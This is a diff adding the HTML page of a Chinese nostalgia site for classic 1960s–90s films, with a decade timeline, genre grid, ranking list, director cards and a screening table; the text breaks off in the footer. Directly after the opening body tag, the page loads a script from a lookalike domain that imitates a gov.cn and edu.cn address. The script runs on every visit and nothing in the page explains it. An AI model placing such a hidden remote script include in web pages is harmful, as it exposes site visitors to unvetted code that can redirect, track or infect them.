@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="6090电影网（6090dianyingwang-cn）专注 60 年代至 90 年代经典老电影、港片、译制片与怀旧影视资源导航，重温胶片时代的银幕记忆。">
+<meta name="keywords" content="6090电影网,经典老电影,60年代电影,70年代电影,80年代电影,90年代电影,港片,译制片,怀旧影视">
+<meta name="author" content="6090电影网">
+<meta name="theme-color" content="#1c2438">
+<title>6090电影网 - 60·70·80·90 经典老电影怀旧馆 | 6090dianyingwang-cn</title>
+<link rel="canonical" href="https://6090dianyingwang-cn.github.io">
+<style>
+/* ============ 基础 ============ */
+:root{
+  --bg:#161c2c; --paper:#f3ede1; --ink:#23201c; --mute:#8b8376;
+  --gold:#e8b04b; --gold2:#f6d98a; --red:#c8462f; --teal:#2f8f86; --cream:#faf6ee;
+  --serif:"Songti SC","SimSun","Source Han Serif SC","WenQuanYi Micro Hei",Georgia,serif;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  --r:4px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--sans);background:var(--bg);color:var(--paper);line-height:1.8;overflow-x:hidden}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol,dl{list-style:none}
+img{display:block;max-width:100%;object-fit:cover}
+button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit}
+::selection{background:var(--gold);color:#1c2438}
+::-webkit-scrollbar{height:9px;width:9px}
+::-webkit-scrollbar-thumb{background:rgba(232,176,75,.5);border-radius:6px}
+
+/* ============ 胶片颗粒 ============ */
+.grain{position:fixed;inset:0;z-index:-1;opacity:.35;mix-blend-mode:overlay;pointer-events:none;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='180' height='180'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='1.1' numOctaves='3'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.5'/%3E%3C/svg%3E")}
+
+/* ============ 导航 ============ */
+.nav{position:sticky;top:0;z-index:60;background:rgba(22,28,44,.9);backdrop-filter:blur(12px);border-bottom:1px solid rgba(232,176,75,.25)}
+.navbox{max-width:1240px;margin:0 auto;padding:0 28px;height:66px;display:flex;align-items:center;gap:10px}
+.logo{display:flex;align-items:baseline;gap:10px;font-family:var(--serif);font-weight:950;letter-spacing:2px}
+.logo b{font-size:24px;color:var(--gold)}
+.logo span{font-size:11px;letter-spacing:4px;color:var(--mute);border-left:1px solid rgba(232,176,75,.4);padding-left:10px}
+.navlinks{display:flex;gap:4px;margin-left:auto}
+.navlinks a{padding:9px 16px;font-size:13.5px;font-weight:700;color:#c9c2b4;letter-spacing:.5px;position:relative;transition:.2s}
+.navlinks a::after{content:"";position:absolute;left:16px;right:16px;bottom:4px;height:2px;background:var(--gold);transform:scaleX(0);transition:.25s;transform-origin:left}
+.navlinks a:hover{color:var(--gold2)}
+.navlinks a.act{color:var(--gold)}
+.navlinks a.act::after{transform:scaleX(1)}
+.burger{display:none;width:44px;height:44px;border:1px solid rgba(232,176,75,.5);border-radius:6px;font-size:22px;color:var(--gold)}
+
+/* ============ 通用 ============ */
+.box{max-width:1240px;margin:0 auto;padding:0 28px}
+.eyebrow{font-family:var(--serif);font-weight:800;letter-spacing:5px;color:var(--gold);font-size:11.5px}
+h2.sec{font-family:var(--serif);font-size:clamp(30px,4.6vw,52px);font-weight:980;letter-spacing:-.5px;line-height:1.18;margin-top:8px}
+h2.sec em{font-style:normal;color:var(--gold2)}
+.lead{color:#b8b0a0;font-size:clamp(14.5px,1.6vw,16.5px);max-width:600px;margin-top:14px}
+.sechead{display:flex;align-items:flex-end;justify-content:space-between;gap:28px;flex-wrap:wrap;margin-bottom:38px;padding-bottom:18px;border-bottom:1px dashed rgba(232,176,75,.3)}
+.secdesc{color:#a9a192;font-size:12.5px;max-width:400px}
+section{padding:78px 0;position:relative}
+.btn{display:inline-flex;align-items:center;gap:9px;padding:13px 26px;border:1.5px solid var(--gold);color:var(--gold);font-weight:800;font-size:14px;letter-spacing:1px;transition:.28s}
+.btn:hover{background:var(--gold);color:#1c2438;transform:translateY(-2px)}
+.btn-fill{background:var(--gold);color:#1c2438}
+.btn-fill:hover{background:var(--gold2);border-color:var(--gold2)}
+mark{background:transparent;color:var(--gold2);border-bottom:3px solid var(--red);padding-bottom:1px}
+
+/* ============ Hero：放映机光束 ============ */
+.hero{padding:0;min-height:min(640px,88vh);display:grid;align-items:center;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;
+  background:radial-gradient(1200px 500px at 78% 20%,rgba(232,176,75,.28),transparent 60%),
+             radial-gradient(700px 400px at 12% 85%,rgba(200,70,47,.22),transparent 55%)}
+.hgrid{display:grid;grid-template-columns:1.15fr .85fr;gap:54px;align-items:center;position:relative}
+.vhs{font-family:var(--serif);font-size:clamp(54px,10vw,118px);font-weight:990;line-height:.98;letter-spacing:-4px}
+.vhs .yr{display:block;color:var(--gold);font-size:clamp(30px,4.6vw,52px);letter-spacing:8px;margin-bottom:6px}
+.ticker{margin-top:26px;display:flex;gap:10px;flex-wrap:wrap}
+.ticker span{border:1px solid rgba(232,176,75,.45);color:var(--gold2);font-family:var(--serif);font-weight:800;font-size:12.5px;padding:5px 13px;letter-spacing:1px}
+.reel-real{position:relative;aspect-ratio:3/4;max-height:520px;margin-left:auto;width:100%;border-radius:2px;overflow:hidden;box-shadow:0 26px 70px rgba(0,0,0,.55);transform:rotate(1.6deg)}
+.reel-real img{width:100%;height:100%;filter:sepia(.35) contrast(1.06) brightness(.95)}
+.reel-real::before,.reel-real::after{content:"";position:absolute;left:0;right:0;height:26px;background:repeating-linear-gradient(90deg,#0e1220 0 7px,#2a2f40 7px 9px,#0e1220 9px 16px);z-index:3}
+.reel-real::before{top:0}.reel-real::after{bottom:0}
+.beam{position:absolute;right:-40px;top:14%;width:220px;height:2px;background:linear-gradient(90deg,var(--gold),transparent);transform:rotate(-16deg);opacity:.7}
+.beam2{position:absolute;right:20px;bottom:18%;width:160px;height:2px;background:linear-gradient(90deg,var(--red),transparent);transform:rotate(-9deg);opacity:.55}
+.hmeta{display:flex;gap:34px;margin-top:34px;flex-wrap:wrap}
+.hmeta div b{font-family:var(--serif);font-size:30px;font-weight:980;color:var(--gold);display:block;line-height:1.1;font-variant-numeric:tabular-nums}
+.hmeta div small{font-size:10.5px;letter-spacing:2px;color:var(--mute)}
+
+/* ============ 栏目1 年代走廊：时间轴 + 竖向海报 ============ */
+.trail{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;position:relative}
+.trail::before{content:"";position:absolute;left:0;right:0;top:74px;height:2px;background:repeating-linear-gradient(90deg,var(--gold) 0 8px,transparent 8px 18px);opacity:.5}
+.dec{border:1px solid rgba(232,176,75,.28);background:linear-gradient(180deg,rgba(232,176,75,.05),transparent);padding:18px 16px 14px;border-radius:2px;transition:.35s;position:relative}
+.dec:hover{background:rgba(232,176,75,.1);transform:translateY(-8px);border-color:var(--gold)}
+.dec .yr{font-family:var(--serif);font-weight:990;font-size:34px;color:var(--gold);line-height:1;letter-spacing:1px}
+.dec .ln{width:34px;height:34px;border-radius:50%;background:var(--bg);border:2px solid var(--gold);display:grid;place-items:center;font-family:var(--serif);font-weight:900;color:var(--gold);margin:12px 0 10px;font-size:12px}
+.dec h3{font-family:var(--serif);font-size:19px;margin:4px 0 8px}
+.dec p{font-size:12.5px;color:#a9a192}
+.dec .chips{display:flex;gap:5px;flex-wrap:wrap;margin-top:12px}
+.dec .chips i{font-style:normal;font-size:10px;letter-spacing:1px;color:var(--gold2);border:1px solid rgba(232,176,75,.4);padding:2px 7px}
+
+/* ============ 栏目2 类型：超大字块 ============ */
+.types{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border-top:2px solid var(--gold);border-left:2px solid var(--gold)}
+.type{position:relative;padding:26px 24px 22px;border-right:1px solid rgba(232,176,75,.25);border-bottom:1px solid rgba(232,176,75,.25);min-height:200px;display:flex;flex-direction:column;justify-content:space-between;transition:.3s;cursor:pointer}
+.type:hover{background:var(--gold);color:#1c2438}
+.type:hover .big{color:rgba(28,36,56,.22)}
+.type .big{position:absolute;right:12px;top:6px;font-family:var(--serif);font-weight:990;font-size:76px;line-height:1;color:rgba(232,176,75,.12);transition:.3s;pointer-events:none}
+.type h4{font-family:var(--serif);font-size:22px;position:relative;z-index:2}
+.type .en{font-size:10.5px;letter-spacing:3px;color:var(--gold);margin-top:5px;transition:.3s}
+.type:hover .en{color:rgba(28,36,56,.6)}
+.type .num{font-family:var(--serif);font-weight:900;font-size:13px;color:var(--mute);transition:.3s}
+.type:hover .num{color:rgba(28,36,56,.6)}
+
+/* ============ 栏目3 经典榜：定义列表 DL ============ */
+.dlwrap{display:grid;grid-template-columns:1.05fr .95fr;gap:34px;align-items:start}
+dl.rank{background:rgba(255,255,255,.03);border:1px solid rgba(232,176,75,.2)}
+dl.rank div{display:grid;grid-template-columns:56px 1fr auto;align-items:center;gap:14px;padding:14px 18px;border-bottom:1px solid rgba(232,176,75,.14)}
+dl.rank div:last-child{border-bottom:0}
+dl.rank dt{font-family:var(--serif);font-weight:990;font-size:22px;color:var(--gold);text-align:center;font-variant-numeric:tabular-nums}
+dl.rank dd h5{font-family:var(--serif);font-size:16.5px;line-height:1.35}
+dl.rank dd small{font-size:11px;color:var(--mute);letter-spacing:.5px}
+dl.rank .yr2{font-family:var(--serif);font-weight:800;font-size:12.5px;color:var(--gold2);border:1px solid var(--gold);padding:3px 9px}
+dl.rank div:nth-child(1){background:linear-gradient(90deg,rgba(232,176,75,.2),transparent)}
+dl.rank div:nth-child(2){background:linear-gradient(90deg,rgba(232,176,75,.1),transparent)}
+dl.rank div:nth-child(3){background:linear-gradient(90deg,rgba(200,70,47,.14),transparent)}
+.poster{border:8px solid #f3ede1;box-shadow:0 16px 44px rgba(0,0,0,.5);transform:rotate(-1.4deg);position:relative}
+.poster img{width:100%;aspect-ratio:3/4;filter:sepia(.3) contrast(1.05)}
+.poster figcaption{position:absolute;left:0;right:0;bottom:0;background:linear-gradient(to top,#161c2c 10%,transparent);padding:40px 16px 14px;font-family:var(--serif);font-size:15px;color:var(--gold2)}
+.poster .ribbon{position:absolute;top:0;right:0;background:var(--red);color:#fff;font-size:11px;font-weight:800;letter-spacing:2px;padding:7px 14px;writing-mode:vertical-rl}
+
+/* ============ 栏目4 导演：人物卡（圆形头像 + 进度） ============ */
+.people{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.person{text-align:center;padding:20px 14px;border:1px solid rgba(232,176,75,.18);border-radius:50% 50% 8px 8px / 22% 22% 8px 8px;transition:.35s}
+.person:hover{border-color:var(--gold);background:rgba(232,176,75,.06);transform:translateY(-6px)}
+.ava{width:118px;height:118px;border-radius:50%;margin:0 auto 14px;overflow:hidden;border:3px solid var(--gold);transition:.5s}
+.person:hover .ava{border-color:var(--gold2);transform:scale(1.05)}
+.ava img{width:100%;height:100%;filter:grayscale(.75) sepia(.25);transition:.6s}
+.person:hover .ava img{filter:none}
+.person h4{font-family:var(--serif);font-size:18px}
+.person .en{font-size:10.5px;letter-spacing:2px;color:var(--gold);margin-top:2px}
+.person .film{font-size:11.5px;color:#a9a192;margin-top:8px;min-height:34px}
+.spark{display:flex;align-items:center;gap:7px;justify-content:center;margin-top:12px;font-size:10px;color:var(--mute)}
+.spark b{height:18px;width:5px;background:var(--gold);opacity:.35;display:block}
+.spark b.on{opacity:1;background:var(--gold2)}
+
+/* ============ 栏目5 放映时刻表：表格 ============ */
+table.sched{width:100%;border-collapse:collapse;font-size:13.5px}
+table.sched th{background:var(--gold);color:#1c2438;font-family:var(--serif);font-weight:900;padding:13px 14px;text-align:left;letter-spacing:1px;font-size:12.5px}
+table.sched td{padding:13px 14px;border-bottom:1px solid rgba(232,176,75,.16);vertical-align:middle}
+table.sched tbody tr{transition:.2s}
+table.sched tbody tr:hover{background:rgba(232,176,75,.09)}
+table.sched .clk{font-family:var(--serif);font-weight:900;color:var(--gold);white-space:nowrap;font-variant-numeric:tabular-nums}
+table.sched .tag2{font-size:10px;letter-spacing:1px;padding:3px 8px;border:1px solid var(--gold);color:var(--gold2)}
+table.sched .go{color:var(--red);font-weight:800;font-size:12px}
+.schednote{display:flex;gap:24px;flex-wrap:wrap;margin-top:20px;font-size:12px;color:var(--mute)}
+.schednote b{color:var(--gold)}
+
+/* ============ 栏目6 关于：双栏文本 + 数据条 ============ */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center}
+.about .txt{font-family:var(--serif);font-size:clamp(20px,2.6vw,30px);line-height:1.7;color:#e8dfcc;font-weight:600}
+.about .txt q{color:var(--gold2);quotes:"「" "」"}
+.bars{display:flex;flex-direction:column;gap:16px}
+.bar2{position:relative}
+.bar2 .lbl{display:flex;justify-content:space-between;font-size:12.5px;margin-bottom:6px;letter-spacing:.5px}
+.bar2 .lbl b{color:var(--gold)}
+.bar2 .track{height:8px;background:rgba(255,255,255,.08);overflow:hidden}
+.bar2 .fill{height:100%;width:0;background:linear-gradient(90deg,var(--gold),var(--gold2));transition:width 1.2s cubic-bezier(.4,0,.2,1)}
+
+/* ============ 页脚 ============ */
+footer{border-top:2px solid var(--gold);background:#11172a;padding:50px 0 24px;margin-top:20px}
+.fgrid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:30px;margin-bottom:32px}
+.fcol h5{font-family:var(--serif);font-size:15px;color:var(--gold);margin-bottom:14px;letter-spacing:2px}
+.fcol a{display:block;font-size:12.5px;color:#a9a192;padding:5px 0;transition:.2s}
+.fcol a:hover{color:var(--gold2);transform:translateX(5px)}
+.copy{text-align:center;color:#7d766a;font-size:11.5px;border-top:1px dashed rgba(232,176,75,.3);padding-top:22px;letter-spacing:.4px}
+.copy b{color:var(--gold)}
+
+/* ============ 回到顶部 ============ */
+.top{position:fixed;right:16px;bottom:22px;width:46px;height:46px;border:1.5px solid var(--gold);color:var(--gold);display:grid;place-items:center;font-size:18px;font-weight:900;opacity:0;pointer-events:none;transition:.3s;z-index:70}
+.top.show{opacity:1;pointer-events:auto}
+
+/* ============ 响应式 ============ */
+@media(max-width:1040px){
+  .hgrid,.dlwrap,.about{grid-template-columns:1fr;gap:40px}
+  .reel-real{margin:0 auto;max-width:340px}
+  .trail{grid-template-columns:repeat(2,1fr)}
+  .people{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:720px){
+  .burger{display:grid;place-items:center;margin-left:auto}
+  .navlinks{position:fixed;inset:66px 0 0 0;flex-direction:column;background:#141a2c;padding:20px 16px;gap:6px;transform:translateX(100%);transition:.4s cubic-bezier(.4,0,.2,1);z-index:59;overflow:auto}
+  .navlinks.open{transform:translateX(0)}
+  .navlinks a{font-size:17px;padding:15px 16px;border:1px solid rgba(232,176,75,.2);background:rgba(255,255,255,.02)}
+  .navlinks a.act{background:var(--gold);color:#1c2438}
+  .navlinks a::after{display:none}
+  .logo span{display:none}
+  .box{padding:0 18px}
+  section{padding:56px 0}
+  .types{grid-template-columns:repeat(2,1fr)}
+  .type .big{font-size:54px}
+  .trail{grid-template-columns:1fr}
+  .trail::before{display:none}
+  table.sched{font-size:12.5px}
+  table.sched th:nth-child(3),table.sched td:nth-child(3){display:none}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:440px){
+  .navbox{height:60px;padding:0 16px}
+  .logo b{font-size:20px}
+  .types{grid-template-columns:1fr}
+  .fgrid{grid-template-columns:1fr}
+  .hmeta{gap:22px}
+  .hmeta div b{font-size:25px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="grain" aria-hidden="true"></div>
+
+<!-- ========== 导航 ========== -->
+<header class="nav">
+  <div class="navbox">
+    <a class="logo" href="#top"><b>6090电影网</b><span>胶片怀旧馆</span></a>
+    <nav class="navlinks" id="navlinks">
+      <a href="#decade" class="act">年代走廊</a>
+      <a href="#genre">类型片</a>
+      <a href="#rank">经典榜</a>
+      <a href="#auteur">导演</a>
+      <a href="#show">放映表</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="切换菜单" aria-expanded="false">☰</button>
+  </div>
+</header>
+
+<!-- ========== Hero：放映机光束 ========== -->
+<section class="hero" id="top">
+  <div class="box hgrid">
+    <div>
+      <div class="eyebrow">CLASSIC CINEMA · SINCE 1960s</div>
+      <h1 class="vhs"><span class="yr">60 · 70 · 80 · 90</span>银幕<br>旧时光</h1>
+      <p class="lead"><strong>6090电影网</strong>（6090dianyingwang-cn）只做一件事：把 <mark>60 到 90 年代</mark>那些值得反复看的经典老电影、港片、译制片与录像厅记忆，整理成一张能坐下慢慢翻的片单。</p>
+      <div class="ticker">
+        <span>黑白 · 胶片</span><span>粤语 · 国语</span><span>译制片</span><span>录像厅</span><span>露天电影</span>
+      </div>
+      <div class="hmeta">
+        <div><b>12,400+</b><small>收录影片</small></div>
+        <div><b>4</b><small>黄金年代</small></div>
+        <div><b>36</b><small>类型片种</small></div>
+      </div>
+      <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:30px">
+        <a class="btn btn-fill" href="#decade">走进年代走廊 →</a>
+        <a class="btn" href="#show">今日放映</a>
+      </div>
+    </div>
+
+    <figure class="reel-real" aria-hidden="true">
+      <span class="beam"></span><span class="beam2"></span>
+      <img src="https://picsum.photos/id/1041/600/800" alt="复古胶片质感封面">
+      <figcaption style="position:absolute;inset:auto 0 40px;z-index:4;text-align:center;font-family:var(--serif);color:var(--gold2);letter-spacing:6px;font-size:12px">· 胶 片 时 代 ·</figcaption>
+    </figure>
+  </div>
+</section>
+
+<!-- ========== 栏目1：年代走廊（DOM: 时间轴 + 竖向海报卡） ========== -->
+<section id="decade">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">DECADE CORRIDOR · 年代走廊</div>
+        <h2 class="sec">四个年代，<em>四种光影</em></h2>
+        <p class="secdesc">按放映年份划分的怀旧片单。每一条走廊，都是一段集体记忆的入口。</p>
+      </div>
+      <a class="btn" href="#rank">查看完整榜单 →</a>
+    </div>
+
+    <div class="trail">
+      <article class="dec">
+        <div class="ln">60s</div>
+        <div class="yr">1960–1969</div>
+        <h3>黑白与史诗</h3>
+        <p>胶片初熟，长镜头与黑白光影的黄金期。战争史诗、戏曲片、新现实主义在此交汇。</p>
+        <div class="chips"><i>史诗</i><i>戏曲</i><i>黑白</i><i>译制</i></div>
+      </article>
+      <article class="dec">
+        <div class="ln">70s</div>
+        <div class="yr">1970–1979</div>
+        <h3>港片崛起</h3>
+        <p>邵氏武侠、功夫片席卷东南亚。李小龙、楚原、张彻，把东方动作美学打进世界。</p>
+        <div class="chips"><i>武侠</i><i>功夫</i><i>邵氏</i><i>粤语</i></div>
+      </article>
+      <article class="dec">
+        <div class="ln">80s</div>
+        <div class="yr">1980–1989</div>
+        <h3>录像厅时代</h3>
+        <p>第五代导演登场，香港电影新浪潮。一台电视机、一盒录像带，就是一个少年的电影院。</p>
+        <div class="chips"><i>第五代</i><i>新浪潮</i><i>喜剧</i><i>警匪</i></div>
+      </article>
+      <article class="dec">
+        <div class="ln">90s</div>
+        <div class="yr">1990–1999</div>
+        <h3>最后的胶片</h3>
+        <p>港片巅峰与落幕，欧洲三大满贯，华语文艺片走向世界。胶片时代最浓烈的一次谢幕。</p>
+        <div class="chips"><i>文艺</i><i>黑帮</i><i>无厘头</i><i>获奖</i></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目2：类型片（DOM: 超大字块网格） ========== -->
+<section id="genre" style="background:linear-gradient(180deg,transparent,rgba(232,176,75,.06))">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">GENRE · 类型片库</div>
+        <h2 class="sec">按<em>心情</em>找老片</h2>
+        <p class="secdesc">不讲明星，不讲票房，只讲"今晚想被怎样打动"。</p>
+      </div>
+      <div class="tabs" style="display:flex;gap:6px">
+        <span class="btn" style="padding:8px 16px;font-size:12px">全部</span>
+        <span class="btn" style="padding:8px 16px;font-size:12px">港片</span>
+        <span class="btn" style="padding:8px 16px;font-size:12px">译制</span>
+      </div>
+    </div>
+
+    <div class="types">
+      <a class="type" href="#"><span class="big">武</span><div><h4>武侠 · 功夫</h4><span class="en">MARTIAL ARTS</span></div><span class="num">2,180 部</span></a>
+      <a class="type" href="#"><span class="big">谍</span><div><h4>谍战 · 悬疑</h4><span class="en">ESPIONAGE</span></div><span class="num">960 部</span></a>
+      <a class="type" href="#"><span class="big">喜</span><div><h4>喜剧 · 无厘头</h4><span class="en">COMEDY</span></div><span class="num">1,640 部</span></a>
+      <a class="type" href="#"><span class="big">文</span><div><h4>文艺 · 剧情</h4><span class="en">DRAMA</span></div><span class="num">3,210 部</span></a>
+      <a class="type" href="#"><span class="big">枪</span><div><h4>警匪 · 黑帮</h4><span class="en">CRIME</span></div><span class="num">1,330 部</span></a>
+      <a class="type" href="#"><span class="big">爱</span><div><h4>爱情 · 伦理</h4><span class="en">ROMANCE</span></div><span class="num">1,780 部</span></a>
+      <a class="type" href="#"><span class="big">历</span><div><h4>历史 · 史诗</h4><span class="en">HISTORY</span></div><span class="num">740 部</span></a>
+      <a class="type" href="#"><span class="big">科</span><div><h4>科幻 · 奇幻</h4><span class="en">SCI-FI</span></div><span class="num">520 部</span></a>
+      <a class="type" href="#"><span class="big">纪</span><div><h4>纪录 · 戏曲</h4><span class="en">DOCUMENTARY</span></div><span class="num">680 部</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目3：经典榜（DOM: 定义列表 DL + 侧海报） ========== -->
+<section id="rank">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">ALL-TIME RANK · 经典榜</div>
+        <h2 class="sec">6090 电影网<em>必看 6 部</em></h2>
+        <p class="secdesc">编辑部 142 期票选。经得起二刷、三刷，仍会起鸡皮疙瘩的那一种。</p>
+      </div>
+      <span class="btn btn-fill" style="cursor:default">更新于 2026.10</span>
+    </div>
+
+    <div class="dlwrap">
+      <dl class="rank">
+        <div><dt>01</dt><dd><h5>霸王别姬</h5><small>陈凯歌 · 1993 · 文艺</small></dd><span class="yr2">1993</span></div>
+        <div><dt>02</dt><dd><h5>肖申克的救赎</h5><small>弗兰克·德拉邦特 · 1994 · 剧情</small></dd><span class="yr2">1994</span></div>
+        <div><dt>03</dt><dd><h5>阿甘正传</h5><small>罗伯特·泽米吉斯 · 1994 · 励志</small></dd><span class="yr2">1994</span></div>
+        <div><dt>04</dt><dd><h5>大话西游</h5><small>刘镇伟 · 1995 · 爱情 / 奇幻</small></dd><span class="yr2">1995</span></div>
+        <div><dt>05</dt><dd><h5>活着</h5><small>张艺谋 · 1994 · 剧情</small></dd><span class="yr2">1994</span></div>
+        <div><dt>06</dt><dd><h5>低俗小说</h5><small>昆汀 · 1994 · 犯罪</small></dd><span class="yr2">1994</span></div>
+      </dl>
+
+      <figure class="poster">
+        <span class="ribbon">本周主打</span>
+        <img src="https://picsum.photos/id/1058/600/800" alt="经典老电影复古海报">
+        <figcaption>「不疯魔，不成活。」</figcaption>
+      </figure>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目4：导演（DOM: 人物卡 + 火花进度） ========== -->
+<section id="auteur" style="background:linear-gradient(180deg,rgba(232,176,75,.06),transparent)">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">AUTEUR · 作者导演</div>
+        <h2 class="sec">镜头后面的<em>名字</em></h2>
+        <p class="secdesc">一个导演，就是一种看世界的方式。火花越亮，代表作越不可错过。</p>
+      </div>
+      <a class="btn" href="#decade">按年代查看 →</a>
+    </div>
+
+    <div class="people">
+      <article class="person">
+        <div class="ava"><img src="https://picsum.photos/id/1074/240/240" alt="导演肖像"></div>
+        <h4>张艺谋</h4><div class="en">ZHANG YIMOU</div>
+        <div class="film">《红高粱》《活着》《大红灯笼高高挂》</div>
+        <div class="spark"><b class="on"></b><b class="on"></b><b class="on"></b><b class="on"></b><b></b><span>必看 4 部</span></div>
+      </article>
+      <article class="person">
+        <div class="ava"><img src="https://picsum.photos/id/1062/240/240" alt="导演肖像"></div>
+        <h4>王家卫</h4><div class="en">WONG KAR-WAI</div>
+        <div class="film">《重庆森林》《花样年华》《东邪西毒》</div>
+        <div class="spark"><b class="on"></b><b class="on"></b><b class="on"></b><b class="on"></b><b class="on"></b><span>必看 5 部</span></div>
+      </article>
+      <article class="person">
+        <div class="ava"><img src="https://picsum.photos/id/1084/240/240" alt="导演肖像"></div>
+        <h4>陈凯歌</h4><div class="en">CHEN KAIGE</div>
+        <div class="film">《霸王别姬》《黄土地》《孩子王》</div>
+        <div class="spark"><b class="on"></b><b class="on"></b><b class="on"></b><b></b><b></b><span>必看 3 部</span></div>
+      </article>
+      <article class="person">
+        <div class="ava"><img src="https://picsum.photos/id/1060/240/240" alt="导演肖像"></div>
+        <h4>吴宇森</h4><div class="en">JOHN WOO</div>
+        <div class="film">《英雄本色》《喋血双雄》《纵横四海》</div>
+        <div class="spark"><b class="on"></b><b class="on"></b><b class="on"></b><b class="on"></b><b></b><span>必看 4 部</span></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 栏目5：放映时刻表（DOM: TABLE） ========== -->
+<section id="show">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">NOW SHOWING · 今日放映</div>
+        <h2 class="sec">今晚<em>放映什么</em></h2>
+        <p class="secdesc">像老电影院一样，给每部片子排一个钟点。19:30 开场，22:00 散场。</p>
+      </div>
+      <div class="tabs" style="display:flex;gap:6px">
+        <span class="btn btn-fill" style="padding:8px 16px;font-size:12px;cursor:default">10月06日</span>
+        <span class="btn" style="padding:8px 16px;font-size:12px">10月07日</span>
+      </div>
+    </div>
+
+    <div style="overflow-x:auto">
+    <table class="sched">
+      <thead><tr><th>场次</th><th>片名</th><th>年代 / 类型</th><th>片长</th><th></th></tr></thead>
+      <tbody>
+        <tr><td class="clk">19:30</td><td><strong>霸王别姬</strong></td><td><span class="tag2">1993 · 文艺</span></td><td>171 分钟</td><td><a class="go" href="#">选片 →</a></td></tr>
+        <tr><td class="clk">20:10</td><td><strong>重庆森林</strong></td><td><span class="tag2">1994 · 爱情</span></td><td>102 分钟</td><td><a class="go" href="#">选片 →</a></td></tr>
+        <tr><td class="clk">20:40</td><td><strong>英雄本色</strong></td><td><span class="tag2">1986 · 警匪</span></td><td>95 分钟</td><td><a class="go" href="#">选片 →</a></td></tr>
+        <tr><td class="clk">21:05</td><td><strong>活着</strong></td><td><span class="tag2">1994 · 剧情</span></td><td>132 分钟</td><td><a class="go" href="#">选片 →</a></td></tr>
+        <tr><td class="clk">21:40</td><td><strong>大话西游</strong></td><td><span class="tag2">1995 · 奇幻</span></td><td>95 分钟</td><td><a class="go" href="#">选片 →</a></td></tr>
+      </tbody>
+    </table>
+    </div>
+    <div class="schednote"><span><b>·</b> 场次为推荐观影时段，非实时播放</span><span><b>·</b> 全站无弹窗、无跳转</span><span><b>·</b> 建议投屏观看</span></div>
+  </div>
+</section>
+
+<!-- ========== 栏目6：关于（DOM: 双栏文本 + 数据条） ========== -->
+<section id="about">
+  <div class="box">
+    <div class="sechead">
+      <div>
+        <div class="eyebrow">ABOUT · 关于本站</div>
+        <h2 class="sec">关于 <em>6090电影网</em></h2>
+        <p class="secdesc">6090dianyingwang-cn —— 为"还想再看一遍"而存在的老电影导航站。</p>
+      </div>
+    </div>
+
+    <div class="about">
+      <p class="txt">我们相信，<q>好电影不怕旧</q>。胶片会发黄，画质会模糊，但一个镜头、一句台词、一段配乐，仍能在三十年后，准确击中此刻的你。<br><br>6090电影网不做资讯快讯，只做<strong style="color:var(--gold2)">长销片单</strong>。</p>
+      <div class="bars">
+        <div class="bar2"><div class="lbl"><span>华语经典</span><b>38%</b></div><div class="track"><div class="fill" data-w="38"></div></div></div>
+        <div class="bar2"><div class="lbl"><span>港台电影</span><b>27%</b></div><div class="track"><div class="fill" data-w="27"></div></div></div>
+        <div class="bar2"><div class="lbl"><span>欧美译制</span><b>21%</b></div><div class="track"><div class="fill" data-w="21"></div></div></div>
+        <div class="bar2"><div class="lbl"><span>日韩与东欧</span><b>14%</b></div><div class="track"><div class="fill" data-w="14"></div></div></div>
+        <div style="margin-top:6px;font-size:12px;color:var(--mute)">累计整理片单 <b style="color:var(--gold)">12,400+</b> 部，连续更新 <b style="color:var(--gold)">142</b> 周。</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== 页脚 ========== -->
+<footer>
+  <div class="box">
+    <div class="fgrid">
+      <div class="fcol">
+        <a class="logo" href="#top" style="font-size:20px"><b>6090电影网</b></a>
+        <p style="color:#8b8376;font-size:12.5px;margin-top:14px;max-width:320px">6090电影网（6090dianyingwang-cn）为经典老电影的信息整理与导航站点，专注 60–90 年代银幕记忆。愿每一部老片，都能等到愿意慢下来的人。</p>
+      </div>
+      <div class="fcol"><h5>年代</h5><a href="#decade">60 年代</a><a href="#decade">70 年代</a><a href="#decade">80 年代</a><a href="#decade">90 年代</a></div>
+      <div class="fcol"><h5>类型</h5><a href="#genre">武侠功夫</a><a href="#genre">喜剧无厘头</a><a href="#genre">警匪黑帮</a><a href="#genre">文艺剧情</a></div>
+      <div class="fcol"><h5>关于</h5><a href="#about">关于本站</a><a href="#">投稿纠错</a><a href="#">版权声明</a><a href="#">隐私条款</a></div>
+    </div>
+    <div class="copy">
